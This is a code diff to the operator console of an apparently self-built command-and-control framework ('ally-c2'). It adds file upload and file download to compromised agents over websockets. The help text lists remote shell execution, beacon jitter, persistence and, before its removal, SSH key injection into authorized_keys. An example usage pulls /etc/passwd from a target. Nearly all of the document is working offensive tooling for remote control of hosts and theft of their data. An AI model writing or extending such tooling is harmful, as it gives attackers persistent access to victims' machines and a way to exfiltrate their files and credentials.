@@ -1,10 +1,9 @@
-from os import sendfile
-from re import ASCII
 import readline #for semi shell interaction in input()
 import asyncio
 import json
 import websockets
-import sys
+import os
+import base64
 
 
 from prompt_toolkit import PromptSession, print_formatted_text
@@ -62,42 +61,42 @@ def warning():
 def all_actions(actions):
     if actions == "main":
         print(f"""
-    normal prompt
-    - help
-    - clear
-    - build
-        ip||url /port/ windows||linux
 
-    - list-agents 
-    - use <agent id>
+### SERVER USE ###
 
-              """)
+- help
+- clear
+- build
+    ip||url /port/ windows||linux
+
+- list-agents 
+- use <agent id>
+
+
+          """)
 
     if actions == "use":
         print(f"""
-    anget use
-    - back
-        back to server mode
-    - help
-    - clear
+### AGENT USE ###
 
-    - sh <shell cmd>
-    - ch-beacon <seconds> [jitter%]
-        change agent polling interval by second
-        es. ch-beacon 3600 50 , make polling of 1h + jitter
+- back
+    back to server mode
+- help
+- clear
 
-    - upload <mypath> <agentpath>
-    - download  <agentpath> <mypath>
+- sh <shell cmd>
+- ch-beacon <seconds> [jitter%]
+    change agent polling interval by second
+    es. ch-beacon 3600 50 , make polling of 1h + jitter
 
+- upload <mypath> <agentpath>
+- download  <agentpath> <mypath>
 
-    - ssh-key-inj <raw pub key>
-        injects your key in the ~/.ssh/authorized_keys file
-        
-    - percistance 
-        systemd, windows reg
-        
-              """)
+- percistance 
     
+
+          """)
+
 
 def my_clear():
     clear()
@@ -106,7 +105,7 @@ def command_not_fount():
     print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))
 #-----
 
-
+DOWNLOAD_DESTINATIONS = {}
 
 
 
@@ -122,7 +121,25 @@ async def event_listener(event_url):
                 
                 response = json.loads(response_raw)
                 if response.get("type") == "agent_output":
-                    msg = f"\n{GREEN}[*] Output da agent[{response.get('agent_id')}]:{RESET}\n{response.get('output')}\n"
+                    output_content = response.get('output', '')
+                    agent_id = response.get('agent_id')
+                    
+                    if output_content.startswith("[DOWNLOAD_SUCCESS]|"):
+                        try:
+                            _, b64_data = output_content.split("|", 1)
+                            file_bytes = base64.b64decode(b64_data)
+                            
+                            save_path = DOWNLOAD_DESTINATIONS.pop(agent_id, f"downloaded_{agent_id}_{int(asyncio.get_event_loop().time())}")
+                            
+                            with open(save_path, "wb") as f:
+                                f.write(file_bytes)
+                                
+                            msg = f"\n{GREEN}[+] File downloaded successfully saved as: {save_path}{RESET}\n"
+                        except Exception as e:
+                            msg = f"\n{RED}[-] Error while saving file: {e}{RESET}\n"
+                    else:
+                        msg = f"\n{GREEN}[*] agent output [{agent_id}]:{RESET}\n{output_content}\n"
+                        
                     print_formatted_text(ANSI(msg))
                     
     except websockets.exceptions.ConnectionClosed as e:
@@ -142,7 +159,7 @@ async def use_agent(websocket, agent_id, session):
     with patch_stdout():
         while True:
             shell_cmd = await session.prompt_async(ANSI(f"{BOLD}{PURPLE}agent{RESET}{BOLD}[{agent_id}]{RESET}[ally-c2] > "))
-            shell_cmd= shell_cmd.strip().lower()
+            shell_cmd= shell_cmd.strip()
 
             if not shell_cmd:
                 continue
@@ -198,34 +215,64 @@ async def use_agent(websocket, agent_id, session):
                 print_formatted_text(ANSI(f"\n{GREEN}[+] Beacon updated: {interval}s (Jitter: {jitter}%){RESET}\n"))
                 continue
             
-            elif action == "ssh-key-inj":
-                if len(parts) < 2:
-                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify seconds, jitter (es. ch-beacon 60 10)"))
+
+            elif action == "upload":
+                if len(parts) < 3:
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specifica file locale e destinazione remota (es. upload /tmp/file.txt /var/tmp/file.txt)"))
                     continue
                 
-                interval = parts[1]
-                jitter = parts[2] if len(parts) > 2 else "0"
-                
-                payload = {
-                    "action": "update_beacon",
-                    "agent_id": agent_id,
-                    "interval": int(interval),
-                    "jitter": int(jitter)
-                }
-                await websocket.send(json.dumps(payload))
-                _ = await websocket.recv()
-                
-                print_formatted_text(ANSI(f"\n{GREEN}[+] Beacon updated: {interval}s (Jitter: {jitter}%){RESET}\n"))
+                local_path = parts[1]
+                remote_path = parts[2]
+
+                if not os.path.exists(local_path):
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] File locale non trovato: {local_path}"))
+                    continue
+
+                try:
+                    with open(local_path, "rb") as f:
+                        encoded_data = base64.b64encode(f.read()).decode('utf-8')
+                    
+                    task_data = f"upload {remote_path} {encoded_data}"
+                    
+                    payload = {
+                        "action": "queue_task",
+                        "agent_id": agent_id,
+                        "data": task_data
+                    }
+                    await websocket.send(json.dumps(payload))
+                    _ = await websocket.recv()
+                    print_formatted_text(ANSI(f"\n{GREEN}[+] Task di upload accodato per {local_path} -> {remote_path}{RESET}\n"))
+                except Exception as e:
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Errore lettura file locale: {e}"))
                 continue
 
 
 
-            # elif action == "download":
-            #     continue
-            #
-            # elif action == "upload":
-            #     continue
-            #
+            elif action == "download":
+                if len(parts) < 3:
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specifica file remoto e destinazione locale (es. download /etc/passwd ./passwd.txt)"))
+                    continue
+                
+                remote_path = parts[1]
+                local_path = parts[2] 
+
+                DOWNLOAD_DESTINATIONS[agent_id] = local_path
+
+                task_data = f"download {remote_path}"
+                
+                payload = {
+                    "action": "queue_task",
+                    "agent_id": agent_id,
+                    "data": task_data
+                }
+                await websocket.send(json.dumps(payload))
+                _ = await websocket.recv()
+                print_formatted_text(ANSI(f"\n{BLUE}[*] Task di download accodato per {remote_path} -> {local_path}. In attesa dell'output...{RESET}\n"))
+                continue
+
+
+
+
             # elif action == "percistance":
             #     continue
 
